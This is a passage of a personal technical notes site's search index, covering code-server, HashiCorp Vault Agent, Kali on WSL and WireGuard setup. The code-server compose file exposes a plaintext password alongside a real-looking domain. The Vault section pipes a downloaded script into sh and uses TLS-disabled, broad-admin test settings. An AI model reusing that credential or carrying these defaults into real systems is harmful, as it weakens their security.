\"51821:51821/tcp\"\nrestart: unless-stopped\ncap_add:\n  - NET_ADMIN\n  - SYS_MODULE\nsysctls:\n  - net.ipv4.ip_forward=1\n  - net.ipv4.conf.all.src_valid_mark=1\n</code></pre> <p>```</p>"},{"location":"VSCode/dockercompose/","title":"Dockercompose","text":"<pre><code>---\nversion: \"2.1\"\nservices:\n  code-server:\n    image: lscr.io/linuxserver/code-server:latest\n    container_name: code-server\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=Europe/London\n      - PASSWORD=Madolell1.. #optional\n      - HASHED_PASSWORD= #optional\n      - SUDO_PASSWORD=Madolell1.. #optional\n      - SUDO_PASSWORD_HASH= #optional\n      - PROXY_DOMAIN=code-server.my.domain #optional\n      - DEFAULT_WORKSPACE=/config/workspace #optional\n    volumes:\n      - /path/to/appdata/config:/config\n      - /root/src/core/nginx-data/web:/mnt/mydata\n    expose:\n      - 8443\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.code.entrypoints=websecure\"\n      - \"traefik.http.routers.code.rule=Host(`code.madolell.tk`)\"\n\n    restart: unless-stopped\n    networks:\n      - public\n      - proxy\nnetworks:\n    public:\n    proxy:\n      external: true\n</code></pre>"},{"location":"Vault%20Hashicorp/Vault%20Agent%20%28Persistent%29%20Docker%20Compose%20Setup/","title":"Vault Agent (Persistent) Docker Compose Setup","text":"<p>May 01, 2022</p> <p>\u200b       </p> <p>TL;DR: You can find the code in this Github repo.</p> <p>Recently I needed to integrate Hashicorp Vault with a Java application. For local development I wanted to use Vault Agent which can connect to the Vault server. The advantage of using Vault  Agent is that it bears the brunt of authentication complexity with Vault server (including SSL certificates). Effectively, this means that a  client application can send HTTP requests to Vault Agent without any  need to authenticate. This setup is frequently used in the real world  for example by using Agent Sidecar Injector inside a Kubernetes cluster. It makes it easy for client applications  inside a K8s pod to get/put information to a Vault server without each  one having to perform the tedious authentication process.</p> <p>Surprisingly, I couldn\u2019t find much information on using Vault with  Vault Agent via docker-compose, which in my opinion is by far the  easiest method to set up a Vault playground. I did find this example which served as the inspiration for this post however it  involves a more complex setup as well as using Postgres and Nginx. I\u2019d  like to present the most minimal setup, the bare basics needed to spin  up a Vault Agent and access it locally via <code>localhost</code>.</p> <p>WARNING: the setup is intentionally simplified, please don\u2019t use it in production.</p> <p>First of all we\u2019ll use the official Vault docker images for the <code>docker-compose.yml</code>:</p> <pre><code>version: '3.7'\n\nservices:\n  vault-agent:\n    image: hashicorp/vault:1.9.6\n    restart: always\n    ports:\n      - \"8200:8200\"\n    volumes:\n      - ./helpers:/helpers\n    environment:\n      VAULT_ADDR: \"http://vault:8200\"\n    container_name: vault-agent\n    entrypoint: \"vault agent -log-level debug -config=/helpers/vault-agent.hcl\"\n    depends_on:\n      vault:\n        condition: service_healthy\n  vault:\n    image: hashicorp/vault:1.9.6\n    restart: always\n    volumes:\n      - ./helpers:/helpers\n      - vault_data:/vault/file\n    ports:\n      - \"8201:8200/tcp\"\n    cap_add:\n      - IPC_LOCK\n    container_name: vault\n    entrypoint: \"vault server -config=/helpers/vault-config.hcl\"\n    healthcheck:\n      test: wget --no-verbose --tries=1 --spider http://localhost:8200 || exit 1\n      interval: 10s\n      retries: 12\n      start_period: 10s\n      timeout: 10s\n\nvolumes:\n  vault_data: {}\n</code></pre> <p>Here we\u2019re using the same image to start Vault server in dev mode as  well as start the Vault Agent. In addition a volume is created for <code>helpers</code> directory which will contain:</p> <ol> <li>The policy for Vault server <code>admin-policy.hcl</code>:</li> </ol> <p><code>hcl    path \"sys/health\"    {    capabilities = [\"read\", \"sudo\"]    }    path \"sys/policies/acl\"    {    capabilities = [\"list\"]    }    path \"sys/policies/acl/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"auth/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"sys/auth/*\"    {    capabilities = [\"create\", \"update\", \"delete\", \"sudo\"]    }    path \"sys/auth\"    {    capabilities = [\"read\"]    }    path \"kv/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"secret/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"identity/entity-alias\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"identity/entity-alias/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"identity/entity\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"identity/entity/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"sys/mounts/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"sys/mounts\"    {    capabilities = [\"read\"]    }</code></p> <ol> <li>The policy for Vault Agent <code>vault-agent.hcl</code>:</li> </ol> <p><code>hcl    pid_file = \"./pidfile\"    vault {    address = \"http://vault:8200\"    retry {    num_retries = 5    }    }    auto_auth {    method {    type = \"approle\"    config = {      role_id_file_path = \"/helpers/role_id\"      secret_id_file_path = \"/helpers/secret_id\"      remove_secret_id_file_after_reading = false    }    }    sink \"file\" {    config = {      path = \"/helpers/sink_file\"    }    }    }    cache {    use_auto_auth_token = true    }    listener \"tcp\" {    address = \"0.0.0.0:8200\"    tls_disable = true    }</code></p> <ol> <li>The <code>init.sh</code> script which will create AppRole auth method:</li> </ol> <p>```bash    apk add jq curl    export VAULT_ADDR=http://localhost:8200    root_token=$(cat /helpers/keys.json | jq -r '.root_token')    unseal_vault() {    export VAULT_TOKEN=$root_token    vault operator unseal -address=${VAULT_ADDR} $(cat /helpers/keys.json | jq -r '.keys[0]')    vault login token=$VAULT_TOKEN    }    if [[ -n \"$root_token\" ]]    then      echo \"Vault already initialized\"      unseal_vault    else      echo \"Vault not initialized\"      curl --request POST --data '{\"secret_shares\": 1, \"secret_threshold\": 1}' http://127.0.0.1:8200/v1/sys/init &gt; /helpers/keys.json      root_token=$(cat /helpers/keys.json | jq -r '.root_token')</p> <pre><code> unseal_vault\n\n vault secrets enable -version=2 kv\n vault auth enable approle\n vault policy write admin-policy /helpers/admin-policy.hcl\n vault write auth/approle/role/dev-role token_policies=\"admin-policy\"\n vault read -format=json auth/approle/role/dev-role/role-id \\\n   | jq -r '.data.role_id' &gt; /helpers/role_id\n vault write -format=json -f auth/approle/role/dev-role/secret-id \\\n   | jq -r '.data.secret_id' &gt; /helpers/secret_id\n</code></pre> <p>fi    printf \"\\n\\nVAULT_TOKEN=%s\\n\\n\" $VAULT_TOKEN    ```</p> <ol> <li>Below is the config for the Vault server to be saved in <code>vault-config.hcl</code> file:</li> </ol> <pre><code>storage \"file\" {\n  # this path is used so that volume can be enabled https://hub.docker.com/_/vault\n  path = \"/vault/file\"\n}\n\nlistener \"tcp\" {\n  address     = \"0.0.0.0:8200\"\n  tls_disable = \"true\"\n}\n\napi_addr = \"http://127.0.0.1:8200\"\ncluster_addr = \"https://127.0.0.1:8201\"\nui = true\n</code></pre> <p>Next we\u2019ll create <code>startVault.sh</code> script to start Vault:</p> <pre><code>WAIT_FOR_TIMEOUT=120 # 2 minutes\ndocker-compose up --detach\necho Waiting for Vault Agent container to be up\ncurl https://raw.githubusercontent.com/eficode/wait-for/v2.2.3/wait-for | sh -s -- localhost:8200 -t $WAIT_FOR_TIMEOUT -- echo success\ndocker exec vault /bin/sh -c \"source /helpers/init.sh\"\ndocker restart vault-agent\n</code></pre> <pre><code>#!/bin/sh\n\n# The MIT License (MIT)\n#\n# Copyright (c) 2017 Eficode Oy\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n\nVERSION=\"2.2.3\"\n\nset -- \"$@\" -- \"$TIMEOUT\" \"$QUIET\" \"$PROTOCOL\" \"$HOST\" \"$PORT\" \"$result\"\nTIMEOUT=15\nQUIET=0\n# The protocol to make the request with, either \"tcp\" or \"http\"\nPROTOCOL=\"tcp\"\n\nechoerr() {\n  if [ \"$QUIET\" -ne 1 ]; then printf \"%s\\n\" \"$*\" 1&gt;&amp;2; fi\n}\n\nusage() {\n  exitcode=\"$1\"\n  cat &lt;&lt; USAGE &gt;&amp;2\nUsage:\n  $0 host:port|url [-t timeout] [-- command args]\n  -q | --quiet                        Do not output any status messages\n  -t TIMEOUT | --timeout=timeout      Timeout in seconds, zero for no timeout\n  -v | --version                      Show the version of this tool\n  -- COMMAND ARGS                     Execute command with args after the test finishes\nUSAGE\n  exit \"$exitcode\"\n}\n\nwait_for() {\n  case \"$PROTOCOL\" in\n    tcp)\n      if ! command -v nc &gt;/dev/null; then\n        echoerr 'nc command is missing!'\n        exit 1\n      fi\n      ;;\n    http)\n      if ! command -v wget &gt;/dev/null; then\n        echoerr 'wget command is missing!'\n        exit 1\n      fi\n      ;;\n  esac\n\n  TIMEOUT_END=$(($(date +%s) + TIMEOUT))\n\n  while :; do\n    case \"$PROTOCOL\" in\n      tcp) \n        nc -w 1 -z \"$HOST\" \"$PORT\" &gt; /dev/null 2&gt;&amp;1\n        ;;\n      http)\n        wget --timeout=1 -q \"$HOST\" -O /dev/null &gt; /dev/null 2&gt;&amp;1 \n        ;;\n      *)\n        echoerr \"Unknown protocol '$PROTOCOL'\"\n        exit 1\n        ;;\n    esac\n\n    result=$?\n\n    if [ $result -eq 0 ] ; then\n      if [ $# -gt 7 ] ; then\n        for result in $(seq $(($# - 7))); do\n          result=$1\n          shift\n          set -- \"$@\" \"$result\"\n        done\n\n        TIMEOUT=$2 QUIET=$3 PROTOCOL=$4 HOST=$5 PORT=$6 result=$7\n        shift 7\n        exec \"$@\"\n      fi\n      exit 0\n    fi\n\n    if [ $TIMEOUT -ne 0 -a $(date +%s) -ge $TIMEOUT_END ]; then\n      echo \"Operation timed out\" &gt;&amp;2\n      exit 1\n    fi\n\n    sleep 1\n  done\n}\n\nwhile :; do\n  case \"$1\" in\n    http://*|https://*)\n    HOST=\"$1\"\n    PROTOCOL=\"http\"\n    shift 1\n    ;;\n    *:* )\n    HOST=$(printf \"%s\\n\" \"$1\"| cut -d : -f 1)\n    PORT=$(printf \"%s\\n\" \"$1\"| cut -d : -f 2)\n    shift 1\n    ;;\n    -v | --version)\n    echo $VERSION\n    exit\n    ;;\n    -q | --quiet)\n    QUIET=1\n    shift 1\n    ;;\n    -q-*)\n    QUIET=0\n    echoerr \"Unknown option: $1\"\n    usage 1\n    ;;\n    -q*)\n    QUIET=1\n    result=$1\n    shift 1\n    set -- -\"${result#-q}\" \"$@\"\n    ;;\n    -t | --timeout)\n    TIMEOUT=\"$2\"\n    shift 2\n    ;;\n    -t*)\n    TIMEOUT=\"${1#-t}\"\n    shift 1\n    ;;\n    --timeout=*)\n    TIMEOUT=\"${1#*=}\"\n    shift 1\n    ;;\n    --)\n    shift\n    break\n    ;;\n    --help)\n    usage 0\n    ;;\n    -*)\n    QUIET=0\n    echoerr \"Unknown option: $1\"\n    usage 1\n    ;;\n    *)\n    QUIET=0\n    echoerr \"Unknown argument: $1\"\n    usage 1\n    ;;\n  esac\ndone\n\nif ! [ \"$TIMEOUT\" -ge 0 ] 2&gt;/dev/null; then\n  echoerr \"Error: invalid timeout '$TIMEOUT'\"\n  usage 3\nfi\n\ncase \"$PROTOCOL\" in\n  tcp)\n    if [ \"$HOST\" = \"\" ] || [ \"$PORT\" = \"\" ]; then\n      echoerr \"Error: you need to provide a host and port to test.\"\n      usage 2\n    fi\n  ;;\n  http)\n    if [ \"$HOST\" = \"\" ]; then\n      echoerr \"Error: you need to provide a host to test.\"\n      usage 2\n    fi\n  ;;\nesac\n\nwait_for \"$@\"\n</code></pre> <p>After you created the above files in the <code>helpers</code> directory, the project structure should be as follows:</p> <pre><code>.\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 helpers\n\u2502   \u251c\u2500\u2500 admin-policy.hcl\n\u2502   \u251c\u2500\u2500 init.sh\n\u2502   \u251c\u2500\u2500 vault-agent.hcl\n\u2502   \u2514\u2500\u2500 vault-config.hcl\n\u2514\u2500\u2500 startVault.sh\n</code></pre> <p>Finally, run <code>source startVault.sh</code> to start Vault server and Vault Agent.</p> <p>Now any client application can access Vault Agent over <code>http://localhost:8200</code> on the host machine, for example the following command creates a secret name <code>hello</code>:</p> <pre><code>curl --request POST -H \"Content-Type: application/json\"  \\\n--data '{\"data\":{\"foo\":\"bar\"}}' http://localhost:8200/v1/kv/data/hello\n</code></pre> <p>while this command retrieves the secret name <code>hello</code>:</p> <pre><code>curl http://localhost:8200/v1/kv/data/hello\n</code></pre> <p>In addition Vault web UI is available at <code>http://localhost:8201/ui</code>. In order to log into the UI use the value of <code>root_token</code> field in <code>./helpers/key.json</code> file (using token login method in the UI).</p> <p>Vault server uses file storage backend which makes this a persistent  setup (a docker volume is mounted), so that tokens data will persist  after machine restart or running <code>docker-compose down</code>.</p>"},{"location":"WSL/enableSystemd/","title":"enableSystemd","text":"<pre><code>echo \\\n\"[boot]\nsystemd=true\" &gt; /etc/wsl.conf\ncat /etc/wsl.conf\n</code></pre>"},{"location":"WSL/kali-wsl/","title":"KALI  WSL","text":"<pre><code>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux\n</code></pre> <ul> <li>Restart</li> <li>Open PowerShell as administrator and run:</li> </ul> <pre><code>dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\n</code></pre> <ul> <li> <p>Restart</p> </li> <li> <p>Download and install the WSL2 Linux Kernel from here: https://aka.ms/wsl2kernel</p> </li> <li> <p>Open PowerShell as administrator and run: <code>wsl --set-default-version 2</code></p> </li> <li> <p>Install Kali Linux from the Microsoft Store</p> </li> </ul> <p>Note: to upgrade an existing WSL1 kali-linux installation, type: <code>wsl --set-version kali-linux 2</code></p> <ul> <li>Run Kali and finish the initial setup</li> </ul>"},{"location":"WSL/kali-wsl/#install-win-kex","title":"Install Win-KeX","text":"<ul> <li>Install win-kex via:</li> </ul> <pre><code>kali@kali:~$ sudo apt update\nkali@kali:~$\nkali@kali:~$ sudo apt install -y kali-win-kex\n</code></pre> <p>----- NO ES ORO TODO</p>"},{"location":"WSL/kali-wsl/#run-win-kex","title":"Run Win-KeX","text":""},{"location":"WSL/kali-wsl/#win-kex-supports-three-modes","title":"Win-KeX supports three modes:","text":"<ul> <li>Window Mode:</li> </ul> <p>To start Win-KeX in Window mode with sound support, run</p> <p><code>kex --win -s</code></p> <p>Refer to the Win-KeX Win usage documentation for further information.</p> <ul> <li> <p>Enhanced Session Mode:</p> </li> <li> <p>To start Win-KeX in Enhanced Session Mode with sound support and arm workaround, run</p> </li> </ul> <p><code>kex --esm --ip -s</code></p> <p>Refer to the Win-KeX ESM usage documentation for further information.</p> <ul> <li>Seamless mode:</li> </ul> <p>To start Win-KeX in Seamless mode with sound support, run</p> <p><code>kex --sl -s</code></p> <p>Refer to the Win-KeX SL usage documentation for further information.</p>"},{"location":"WSL/kali-wsl/#optional-steps","title":"Optional Steps:","text":"<ul> <li>If you have the space, why not install \u201cKali with the lot\u201d?: <code>sudo apt install -y kali-linux-large</code></li> </ul> <ul> <li>Create a Windows Terminal Shortcut:</li> </ul> <p>Choose amongst these options:</p> <p>Basic Win-KeX in window mode with sound:</p> <pre><code>{\n      \"guid\": \"{55ca431a-3a87-5fb3-83cd-11ececc031d2}\",\n      \"hidden\": false,\n      \"name\": \"Win-KeX\",\n      \"commandline\": \"wsl -d kali-linux kex --wtstart -s\",\n},\n</code></pre> <p>Advanced Win-KeX in window mode with sound - Kali icon and start in kali home directory:</p> <p>Copy the kali-menu.png icon across to your windows picture directory and add the icon and start directory to your WT config:</p> <pre><code>{\n        \"guid\": \"{55ca431a-3a87-5fb3-83cd-11ececc031d2}\",\n        \"hidden\": false,\n        \"icon\": \"file:///c:/users/&lt;windows user&gt;/pictures/icons/kali-menu.png\",\n        \"name\": \"Win-KeX\",\n        \"commandline\": \"wsl -d kali-linux kex --wtstart -s\",\n        \"startingDirectory\" : \"//wsl$/kali-linux/home/&lt;kali user&gt;\"\n},\n</code></pre> <p>Basic Win-KeX in seamless mode with sound:</p> <pre><code>{\n      \"guid\": \"{55ca431a-3a87-5fb3-83cd-11ececc031d2}\",\n      \"hidden\": false,\n      \"name\": \"Win-KeX\",\n      \"commandline\": \"wsl -d kali-linux kex --sl --wtstart -s\",\n},\n</code></pre> <p>Advanced Win-KeX in seamless mode with sound - Kali icon and start in kali home directory:</p> <p>Copy the kali-menu.png icon across to your windows picture directory and add the icon and start directory to your WT config:</p> <pre><code>{\n        \"guid\": \"{55ca431a-3a87-5fb3-83cd-11ececc031d2}\",\n        \"hidden\": false,\n        \"icon\": \"file:///c:/users/&lt;windows user&gt;/pictures/icons/kali-menu.png\",\n        \"name\": \"Win-KeX\",\n        \"commandline\": \"wsl -d kali-linux kex --sl --wtstart -s\",\n        \"startingDirectory\" : \"//wsl$/kali-linux/home/&lt;kali user&gt;\"\n},\n</code></pre> <p>Basic Win-KeX in ESM mode with sound:</p> <pre><code>{\n      \"guid\": \"{55ca431a-3a87-5fb3-83cd-11ecedc031d2}\",\n      \"hidden\": false,\n      \"name\": \"Win-KeX\",\n      \"commandline\": \"wsl -d kali-linux kex --esm --wtstart -s\",\n},\n</code></pre> <p>Advanced Win-KeX in ESM mode with sound - Kali icon and start in kali home directory:</p> <p>Copy the kali-menu.png icon across to your windows picture directory and add the icon and start directory to your WT config:</p> <pre><code>{\n        \"guid\": \"{55ca431a-3a87-5fb3-83cd-11ecedd031d2}\",\n        \"hidden\": false,\n        \"icon\": \"file:///c:/users/&lt;windows user&gt;/pictures/icons/kali-menu.png\",\n        \"name\": \"Win-KeX\",\n        \"commandline\": \"wsl -d kali-linux kex --esm --wtstart -s\",\n        \"startingDirectory\" : \"//wsl$/kali-linux/home/&lt;kali user&gt;\"\n},\n</code></pre> <p></p> <p></p> <p></p>"},{"location":"WSL/kali-wsl/#help","title":"Help","text":"<p>For more information, ask for help via:</p> <pre><code>kex --help\n</code></pre> <p>or consult the manpage via:</p> <pre><code>man kex\n</code></pre> <p></p> <p>or join us in the Kali Forums</p>"},{"location":"WSL/kali-wsl/#troubleshoots","title":"Troubleshoots","text":"<pre><code>sudo mount -o remount,rw /tmp/.X11-unix\nsudo apt remove -y kali-win-kex &amp;&amp; sudo apt install -y kali-win-kex\n</code></pre> <pre><code>These steps solved it for me:\n\nsudo su (some commands require root)\ncd /tmp\nls -a\nDelete all .XX-lock files you can find (just do rm .X1-lock, rm .X2-lock ...)\nrm -r /tmp/.X11-unix\nrun vncserver\nrun kex\nEnjoy\n</code></pre> <pre><code>After switching to the Windows App version of WSL with\nwsl.exe --update\nI also had this issue.\n\nThis fixed the issue:\n\nsudo apt remove -y kali-win-kex &amp;&amp; sudo apt install -y kali-win-kex\nsudo apt-get update\nsudo apt-get upgrade\nsudo su\numount /tmp/X11-unix\nrm -r /tmp/.X11-unix\nrm /tmp/.X1-lock\nexit\nsudo rm /home/YOURUSERNAME/.Xauthority\nvncserver\nkex\n\nNot all steps are necessary..\n\nSomehow\n\nkex --win -s\nfixed the audio so I have audio now. So input that if you have problems with the audio and WSL. Windows is asking you for permission for audiopulse. Confirm and then you would have the audio..\n</code></pre>"},{"location":"WSL/wlstroubleshoot/","title":"Wlstroubleshoot","text":""},{"location":"WSL/wlstroubleshoot/#no-internet-in-wsl","title":"No internet in wsl","text":"<pre><code>netsh winsock reset \nnetsh int ip reset all\nnetsh winhttp reset proxy\nipconfig /flushdns\nwsl --shutdown\nwsl --restart\n</code></pre> <pre><code>Open Powershell or Cmd as Administrator\nand run each of these commands:\nwsl --shutdown\nnetsh winsock reset\nnetsh int ip reset all\nnetsh winhttp reset proxy\nipconfig /flushdns\nHit the Windows Key,\ntype Network Reset,\nhit enter.\nYou should see this window.\nClick \"Reset now\".\nRestart Windows\n</code></pre>"},{"location":"Wireguard%28VPN%29/Tutorial/","title":"Tutorial","text":"<p>WireGuard is a modern VPN (Virtual Private Network) technology that utilizes state-of-the-art cryptography. Compared to other popular VPN solutions, such as IPsec and OpenVPN , WireGuard is faster, easier to configure, and has a smaller footprint. It is cross-platform and can run almost anywhere, including Linux, Windows, Android, and macOS.</p> <p>Wireguard is a peer-to-peer VPN; it does not use the client-server model. Depending on its configuration, a peer can act as a traditional server or client. It works by creating a network interface on each peer device that acts as a tunnel. Peers authenticate each other by exchanging and validating public keys, mimicking the SSH model. Public keys are mapped with a list of IP addresses that are allowed in the tunnel. The VPN traffic is encapsulated in UDP.</p> <p>In this article, we\u2019ll discuss how to set up a WireGuard VPN on Ubuntu 20.04 that will act as a VPN server. We\u2019ll also show you how to configure WireGuard as a client. The client\u2019s traffic will be routed through the Ubuntu 20.04 server.</p> <p>This setup can be used as a protection against Man in the Middle attacks, surfing the web anonymously, bypassing Geo-restricted content, or allowing your colleagues who work from home to connect to the company network securely.</p>"},{"location":"Wireguard%28VPN%29/Tutorial/#prerequisites","title":"Prerequisites","text":"<p>To follow this guide, you\u2019ll need an Ubuntu 20.04 server with root or sudo access .</p>"},{"location":"Wireguard%28VPN%29/Tutorial/#setting-up-the-wireguard-server","title":"Setting Up the WireGuard Server","text":"<p>We\u2019ll start by installing WireGuard on the Ubuntu machine and set it up to act as a server. We\u2019ll also configure the system to route the clients\u2019 traffic through it.</p>"},{"location":"Wireguard%28VPN%29/Tutorial/#install-wireguard-on-ubuntu-2004","title":"Install WireGuard on Ubuntu 20.04","text":"<p>WireGuard is available from the default Ubuntu repositories. To install it, run the following commands:</p> <pre><code>sudo apt updatesudo apt install wireguardCopyCopy\n</code></pre> <p>This will install the WireGuard module and tools.</p> <p>WireGuard runs as a kernel module.</p>"},{"location":"Wireguard%28VPN%29/Tutorial/#configuring-wireguard","title":"Configuring WireGuard","text":"<p>The <code>wg</code> and <code>wg-quick</code> command-line tools allow you to configure and manage the WireGuard interfaces.</p> <p>Each device in the WireGuard VPN network needs to have a private and public key. Run the following command to generate the key pair:</p> <pre><code>wg genkey | sudo tee /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickeyCopy\n</code></pre> <p>The files will be generated in the <code>/etc/wireguard</code> directory. You can view the contents of the files with <code>cat</code> or <code>less</code> . The private key should never be shared with anyone and should always be kept secure.</p> <p>Wireguard also supports a pre-shared key, which adds an additional layer of symmetric-key cryptography. This key is optional and must be unique for each peer pair.</p> <p>The next step is to configure the tunnel device that will route the VPN traffic.</p> <p>The device can be set up either from the command line using the <code>ip</code> and <code>wg</code> commands, or by creating the configuration file with a text editor.</p> <p>Create a new file named <code>wg0.conf</code> and add the following contents:</p> <pre><code>sudo nano /etc/wireguard/wg0.confCopy\n</code></pre> <p>/etc/wireguard/wg0.conf</p> <pre><code>[Interface]\nAddress = 10.0.0.1/24\nSaveConfig = true\nListenPort = 51820\nPrivateKey = SERVER_PRIVATE_KEY\nPostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE\nPostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -t nat -D POSTROUTING -o ens3 -j MASQUERADE\n</code></pre> <p>Copy</p> <p>The interface can be named anything, however it is recommended to use something like <code>wg0</code> or <code>wgvpn0</code>. The settings in the interface section have the following meaning:</p> <ul> <li> <p>Address - A comma-separated list of v4 or v6 IP addresses for the <code>wg0</code> interface. Use IPs from a range that is reserved for private networks (10.0.0.0/8, 172.16.0.0/12 or 192.168.0.0/16).</p> </li> <li> <p>ListenPort - The listening port.</p> </li> <li> <p>PrivateKey - A private key generated by the <code>wg genkey</code> command. (To see the contents of the file type: <code>sudo cat /etc/wireguard/privatekey</code>)</p> </li> <li> <p>SaveConfig - When set to true, the current state of the interface is saved to the configuration file when shutdown.</p> </li> <li> <p>PostUp - Command or script that is executed before bringing the interface up. In this example, we\u2019re using iptables to enable masquerading. This allows traffic to leave the server, giving the VPN clients access to the Internet.</p> </li> </ul> <p>Make sure to replace <code>ens3</code> after <code>-A POSTROUTING</code> to match the name of your public network interface. You can easily find the interface with:</p> <p><code>ip -o -4 route show to default | awk '{print $5}'Copy</code></p> <ul> <li>PostDown - command or script which is executed before bringing the interface down. The iptables rules will be removed once the interface is down.</li> </ul> <p>The <code>wg0.conf</code> and <code>privatekey</code> files should not be readable to normal users. Use <code>chmod</code> to set the permissions to <code>600</code>:</p> <pre><code>sudo chmod 600 /etc/wireguard/{privatekey,wg0.conf}Copy\n</code></pre> <p>Once done, bring the <code>wg0</code> interface up using the attributes specified in the configuration file:</p> <pre><code>sudo wg-quick up wg0Copy\n</code></pre> <p>The command will produce an output similar to the following:</p> <pre><code>[#] ip link add wg0 type wireguard\n[#] wg setconf wg0 /dev/fd/63\n[#] ip -4 address add 10.0.0.1/24 dev wg0\n[#] ip link set mtu 1420 up dev wg0\n[#] iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE\nCopy\n</code></pre> <p>To check the interface state and configuration, enter:</p> <pre><code>sudo wg show wg0Copy\ninterface: wg0\n  public key: r3imyh3MCYggaZACmkx+CxlD6uAmICI8pe/PGq8+qCg=\n  private key: (hidden)\n  listening port: 51820\nCopy\n</code></pre> <p>You can also run <code>ip a show wg0</code> to verify the interface state:</p> <pre><code>ip a show wg0Copy\n4: wg0: &lt;POINTOPOINT,NOARP,UP,LOWER_UP&gt; mtu 1420 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/none \n    inet 10.0.0.1/24 scope global wg0\n       valid_lft forever preferred_lft forever\nCopy\n</code></pre> <p>WireGuard can also be managed with Systemd.</p> <p>To bring the WireGuard interface at boot time, run the following command:</p> <pre><code>sudo systemctl enable wg-quick@wg0Copy\n</code></pre>"},{"location":"Wireguard%28VPN%29/Tutorial/#server-networking-and-firewall-configuration","title":"Server Networking and Firewall Configuration","text":"<p>IP forwarding must be enabled for NAT to work. Open the <code>/etc/sysctl.conf</code> file and add or uncomment the following line:</p> <pre><code>sudo nano /etc/sysctl.confCopy\n</code></pre> <p>/etc/sysctl.conf</p> <pre><code>net.ipv4.ip_forward=1\n</code></pre> <p>Copy</p> <p>Save the file and apply the change:</p> <pre><code>sudo sysctl -pCopy\nnet.ipv4.ip_forward = 1\nCopy\n</code></pre> <p>If you are using UFW to manage your firewall you need to open UDP traffic on port <code>51820</code>:</p> <pre><code>sudo ufw allow 51820/udpCopy\n</code></pre> <p>That\u2019s it. The Ubuntu peer that will act as a server has been set up.</p>"},{"location":"Wireguard%28VPN%29/Tutorial/#linux-and-macos-clients-setup","title":"Linux and macOS Clients Setup","text":"<p>The installation instructions for all supported platforms are available at https://wireguard.com/install/ . On Linux systems, you can install the package using the distribution package manager and on macOS with <code>brew</code>.</p> <p>Once installed follow the steps below to configure the client device.</p> <p>The process for setting up a Linux and macOS client is pretty much the same as you did for the server. First generate the public and private keys:</p> <pre><code>wg genkey | sudo tee /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickeyCopy\n</code></pre> <p>Create the file <code>wg0.conf</code> and add the following contents:</p> <pre><code>sudo nano /etc/wireguard/wg0.confCopy\n</code></pre> <p>/etc/wireguard/wg0.conf</p> <pre><code>[Interface]\nPrivateKey = CLIENT_PRIVATE_KEY\nAddress = 10.0.0.2/24\n\n\n[Peer]\nPublicKey = SERVER_PUBLIC_KEY\nEndpoint = SERVER_IP_ADDRESS:51820\nAllowedIPs = 0.0.0.0/0\n</code></pre> <p>Copy</p> <p>The settings in the interface section have the same meaning as when setting up the server:</p> <ul> <li>Address - A comma-separated list of v4 or v6 IP addresses for the <code>wg0</code> interface.</li> <li>PrivateKey - To see the contents of the file on the client machine run: <code>sudo cat /etc/wireguard/privatekey</code></li> </ul> <p>The peer section contains the following fields:</p> <ul> <li>PublicKey - A public key of the peer you want to connect to. (The contents of the server\u2019s <code>/etc/wireguard/publickey</code> file).</li> <li>Endpoint - An IP or hostname of the peer you want to connect to followed by a colon, and then a port number on which the remote peer listens to.</li> <li>AllowedIPs - A comma-separated list of v4 or v6 IP addresses from which incoming traffic for the peer is allowed and to which outgoing traffic for this peer is directed. We\u2019re using 0.0.0.0/0 because we are routing the traffic and want the server peer to send packets with any source IP.</li> </ul> <p>If you need to configure additional clients, just repeat the same steps using a different private IP address.</p>"},{"location":"Wireguard%28VPN%29/Tutorial/#windows-clients-setup","title":"Windows Clients Setup","text":"<p>Download and install the Windows msi package from the WireGuard website .</p> <p>Once installed, open the WireGuard application and click on \u201cAdd Tunnel\u201d -&gt; \u201cAdd empty 